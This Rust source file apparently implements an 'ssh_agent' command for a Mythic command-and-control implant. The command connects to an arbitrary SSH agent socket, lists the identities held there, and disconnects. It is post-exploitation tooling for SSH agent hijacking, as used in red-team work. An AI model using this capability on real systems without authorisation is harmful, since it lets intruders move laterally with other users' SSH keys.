use crate::AgentTask;
use crate::mythic_success;
use russh_keys::PublicKeyBase64;
use serde::Deserialize;
use std::env;
use std::error::Error;
use std::result::Result;
use tokio::net::UnixStream;

#[derive(Debug, Deserialize)]
struct SshAgentArgs {
    list: bool,
    connect: Option<String>,
    disconnect: bool,
}

pub fn ssh_agent(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: SshAgentArgs = serde_json::from_str(&task.parameters)?;

    let user_output = if args.list {
        agent_list(&task.id)?
    } else if let Some(ref path) = args.connect {
        agent_connect(&task.id, path)?
    } else if args.disconnect {
        agent_disconnect(&task.id)?
    } else {
        mythic_success!(task.id, "Invalid arguments")
    };

    Ok(user_output)
}

fn agent_connect(id: &str, socket: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    let orig_agent = env::var("SSH_AUTH_SOCK");

    env::set_var("SSH_AUTH_SOCK", socket);

    let rt = tokio::runtime::Handle::current();
    let result = rt.block_on(async {
        let stream = UnixStream::connect(socket).await?;
        let _agent = russh_keys::agent::client::AgentClient::connect(stream);
        Ok::<_, Box<dyn Error>>(())
    });

    if let Err(e) = result {
        if let Ok(orig_socket) = orig_agent {
            env::set_var("SSH_AUTH_SOCK", orig_socket);
        } else {
            env::remove_var("SSH_AUTH_SOCK");
        }
        return Err(e);
    }

    Ok(mythic_success!(id, "Successfully connected to ssh agent"))
}

fn agent_list(id: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    let socket_path = env::var("SSH_AUTH_SOCK")
        .map_err(|_| -> Box<dyn Error> { "Not connected to any ssh agent".into() })?;

    let rt = tokio::runtime::Handle::current();
    let keys = rt.block_on(async {
        let stream = UnixStream::connect(&socket_path).await
            .map_err(|e| -> Box<dyn Error> { format!("Failed to connect to SSH agent: {}", e).into() })?;
        let mut agent = russh_keys::agent::client::AgentClient::connect(stream);
        let identities = agent.request_identities().await
            .map_err(|e| -> Box<dyn Error> { e.into() })?;
        Ok::<_, Box<dyn Error>>(identities)
    })?;

    let user_output = if !keys.is_empty() {
        let mut tmp = String::new();
        for key in &keys {
            let b64_blob = key.public_key_base64();
            tmp.push_str(&format!(
                "Key type: {}\nbase64 blob: {}\n\n",
                key.name(),
                b64_blob,
            ));
        }
        tmp
    } else {
        "No identities in ssh agent".to_string()
    };

    Ok(mythic_success!(id, user_output))
}

fn agent_disconnect(id: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    env::remove_var("SSH_AUTH_SOCK");
    Ok(mythic_success!(id, "Disconnected from ssh agent"))
}
